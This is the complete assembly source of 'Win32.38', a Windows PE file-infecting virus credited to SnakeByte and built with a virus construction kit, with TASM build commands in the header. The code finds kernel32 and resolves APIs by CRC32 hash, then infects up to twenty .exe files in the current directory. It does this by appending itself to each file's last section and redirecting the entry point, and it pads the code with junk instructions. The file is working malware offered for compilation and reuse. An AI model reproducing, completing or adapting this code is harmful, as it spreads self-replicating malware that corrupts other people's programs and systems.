              
;
;
; Win32.38 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.38
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 38
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 28
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ecx
                                        ; mov ebp, ecx
 push ecx
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea ecx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea esi, [ebp+WFD_szFileName]
 or eax, ebx                            ; Trash
 xchg esi, ebx


 push ebx
 shr edx, 17d                           ; Trash
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for maximum filesize
 push dword ptr [ebp+WFD_nFileSizeHigh]
 pop ecx
 cmp ecx, 0
 jne NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx eax, word ptr [ebx]
 cmp eax, 'ZM'
 je Goodfile
                                        ; clear ecx
 mov ecx, 0
 or ecx, ecx
 jz Notagoodfile

Goodfile:
 cmp word ptr [ebx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 push dword ptr [ebx+3Ch]
 pop esi
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, ebx
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [esi]
 sub ecx, 'EP'
 jz Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '38'
 jz Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [esi+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [esi+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; mov edx, -1
 mov edx, ( -1d - 18d )
 add edx, 18d
 and edx, dword ptr [ebp+Attributes]
 push edx
 lea ecx, [ebp+WFD_szFileName]
 and dword ptr [ebp+Trash1], 343636     ; Trash
 xchg edx, ecx

 push edx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 mov esi, ebp
 add esi, offset APIOffsets

 lea ecx, [ebp+APINames]
 xchg ecx, edx


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; esi points to the offset

 call SearchAPI1
 or ecx, 68929416d                      ; Trash
                                        ; add edx, 4
 add edx, 4d
 mov edi, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], edi
                                        ; add esi, 4
 add esi, 4d
 sub ebx, 1
 jnz GetApisLoop
 lea edi, [ebp+Outbreak]
 add ecx, ecx                           ; Trash

 push edi
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 mov ebx, 50663d
 sub ebx, 50663d

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 add ebx, 1d
 push ebx
 mov eax, 80000000h or 40000000h
 push eax
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, edx

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear edx
 mov edx, 56260d
 sub edx, 56260d
 push edx
 push ebx
 push edx
                                        ; mov ecx, 4
 mov ecx, ( 4d + 34d )
 sub ecx, 34d
 push ecx
 push edx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
                                        ; clear ecx
 and ecx, 0
 push ebx
 push ecx
 push ecx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h



 mov ebx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov eax, [ebx+78h]
 add eax, [ebp+KernelMZ]
                                        ; add eax, 28
 dec eax
 add eax, 29d
                                        ; get ATableVA
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ebx
                                        ; add eax, 4
 add eax, 4d
                                        ; get NTableVA
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ebx
                                        ; add eax, 4
 dec eax
 add eax, 5d
                                        ; get OTableVA
 mov ebx, dword ptr [eax]
 add ebx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ebx
                                        ; mov ecx, -1
 push -1d
 pop ecx
 and ecx, dword ptr [ebp+NTableVA]
 rcl ebx, 15d                           ; Trash


SearchNextApi1:                         ; search for the API's
 push ecx
 mov eax, dword ptr [ecx]
 add eax, [ebp+KernelMZ]
                                        ; mov ecx, eax
 push eax
 pop ecx
                                        ; mov edi, eax
 mov edi, eax
 push edi
 mov dword ptr [ebp+TempApisearch3], edx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
 push dword ptr [ebp+APICRC32]
 pop ebx
 sub ebx, dword ptr [edx]
 or ebx, ebx
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop ecx
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 dec ecx
 add ecx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 clc 
 rcl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 mov ecx, eax
 movzx eax, word ptr [ecx]
 sal eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [eax]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 ATableVA    dd 0h
 TempApisearch3 dd 0h
 OTableVA    dd 0h
 TempAPI     dd 0h
 AlignTemp   dd 0h
 NTableVA    dd 0h
 filemask    db '*.ExE',0
 K32Trys     dd 0h
 NewEIP      dd 0h
 Trash1      dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 KernelPE    dd 0h
 db 'Virus : Win32.38 Author : SnakeByte',0
 FindHandle  dd 0h
 FileHandle  dd 0h
 MapAddress  dd 0h
 OldBase     dd 400000h
 Attributes  dd 0h
 NewSize     dd 0h

 APIOffsets:
 XCloseHandle           dd 0h
 XGetFileAttributesA    dd 0h
 XSetFileAttributesA    dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XFindFirstFileA        dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XUnmapViewOfFile       dd 0h

 AlignReg2   dd 0h
 OldEIP      dd 0h
 counter     dw 0h
 Trash2      dd 0h
 MapHandle   dd 0h
 AlignReg1   dd 0h
 APICRC32    dd 0h

 APINames:
 dd 068624A9Dh           ; CloseHandle
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 03C19E536h           ; SetFileAttributesA
 dd 0C200BE21h           ; FindClose
 dd 0797B49ECh           ; MapViewOfFile
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 0AA700106h           ; FindNextFileA
 dd 08C892DDFh           ; CreateFileA
 dd 094524B42h           ; UnmapViewOfFile

 KernelMZ    dd 0h
 InfCounter  dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov eax, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, eax
 add esi, [eax+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 inc esi
 add esi, 59d
 mov edx, [esi]
 inc esi
 sub esi, 61d
                                        ; clear ecx
 mov ecx, 54161d
 sub ecx, 54161d
 add ecx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 mov dword ptr [ebp+AlignReg2], edx
 add ecx, VirusSize
 push ecx
 pop dword ptr [ebp+AlignReg1]
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
                                        ; infect by increasing the last section
 mov esi, eax
                                        ; get last section
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [esi+06h]
 dec edx
 imul edx, edx, 28h
                                        ; add eax, 120
 dec eax
 add eax, 121d
 add eax, edx
                                        ; clear ecx
 mov ecx, 20899d
 sub ecx, 20899d
 add ecx, dword ptr [esi+74h]
 sal ecx, 3
 add eax, ecx
                                        ; get old Entrypoint
 mov edx, dword ptr [esi+34h]
 push edx
 pop dword ptr [ebp+OldBase]
 mov ecx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ecx
                                        ; clear ecx
 mov ecx, -11944d
 add ecx, 11944d

 add ecx, [eax+10h]
                                        ; mov edx, ecx
 push ecx
 pop edx
 add eax, 14h
 add ecx, [eax]
 sub eax, 14h
 push ecx
 push edx
 pop ebx
 add ebx, [eax+0Ch]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], ebx
                                        ; clear ebx
 mov ebx, 0

 add ebx, [eax+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], ebx
 pop ebx
 add ebx,  (VirusSize-1419d)
 add ebx, 1419d
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], ebx
 and dword ptr [ebp+Trash1], ebx        ; Trash
 mov ebx, dword ptr [eax+10h]
 add ebx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], '38'
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 mov eax, eax                           ; Trash
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ebx
 add ebx, -1
 push ebx
 pop dword ptr [ebp+InfCounter]
 clc
ret

NoEXE:
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov esi, 077e00000h
 call GetKernel32
 jnc GetApis
 mov esi, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov esi, 077f00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear edi
 push 0
 pop edi

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[edi]
 mov edx, ebp
 add edx, offset GetKernel32Exception

 push edx
 push eax

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 4h
                                        ; store old EIP and ImageBase
                                        ; clear edi
 mov edi, 0
 xor edi, dword ptr [ebp+Trash1]

 mov dword ptr [ebp+Trash2], edi

 mov edi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], edi

                                        ; clear ecx
 mov ecx, -16640d
 add ecx, 16640d
 add ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx



GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jz GetKernel32NotFound
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je CheckPE

GK2:
 inc esi
 sub esi, 65537d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edi, [esi+3Ch]
 xchg edi, esi
 add esi, edi
 xchg edi, esi
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:

KernelFound:
 push edi
 add ebx, ecx                           ; Trash
 pop dword ptr [ebp+KernelPE]
 push esi
 pop dword ptr [ebp+KernelMZ]

                                        ; clear eax
 push 0
 pop eax

 pop dword ptr fs:[eax]
 pop ebx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear ebx
 sub ebx, ebx

 mov edx, dword ptr fs:[ebx]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear ecx
 mov ecx, -23530d
 add ecx, 23530d

 pop dword ptr fs:[ecx]
 pop eax
 popad
 stc
ret


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, -10740d
 add edx, 10740d
 mov eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+AlignTemp], eax
 div ecx
 sub ecx, edx
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldBase]

 push ecx
 pop dword ptr [ebp+retBase]

 mov esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 xchg esi, edi

                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
 mov [ebp+InfCounter], 20d

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, edx

 push edx
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 mov esi, offset WIN32_FIND_DATA
 add esi, ebp

 push esi
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edx, [ebp+WFD_szFileName]
 xchg ebx, edx

                                        ; mov ecx, 276
 push 276d
 pop ecx

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 inc ebx
 dec ecx
 jnz ClearOldData2
 popad
ret





;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov ebx, edi
                                        ; clear ebx
 xor ebx, ebx
 add ebx, edi
LenCRC:
                                        ; add ebx, 1
 inc ebx
 cmp byte ptr [ebx], 0
 jne LenCRC
 sub ebx, edi
                                        ; mov esi, ebx
                                        ; clear esi
 mov esi, 0
 add esi, ebx
                                        ; add esi, 1
 sub esi, -1d
 cld
                                        ; clear ecx
 mov ecx, -15849d
 add ecx, 15849d
 dec ecx
                                        ; mov edx, ecx
 push ecx
 pop edx
NextByteCRC:
                                        ; clear ebx
 mov ebx, 24787d
 sub ebx, 24787d
                                        ; clear eax
 mov eax, 47492d
 sub eax, 47492d
 mov bl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 xor bl, cl
 mov cl, ch
 mov ch, dl
 mov dl, dh
 mov dh, 8
NextBitCRC:
 shr ax, 1
 rcr bx, 1
jnc NoCRC
 xor bx,08320h
 xor ax,0EDB8h
NoCRC:
 dec dh
jnz NextBitCRC
 xor ecx, ebx
 xor edx, eax
 dec esi
jnz NextByteCRC
 not edx
 not ecx
 mov ebx, edx
 rol ebx, 16d
 mov bx, cx
 mov dword ptr [ebp+APICRC32], ebx
 popad
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
                                        ; clear edx
 and edx, 0
 push edx
 call ExitProcess



end FakeCode

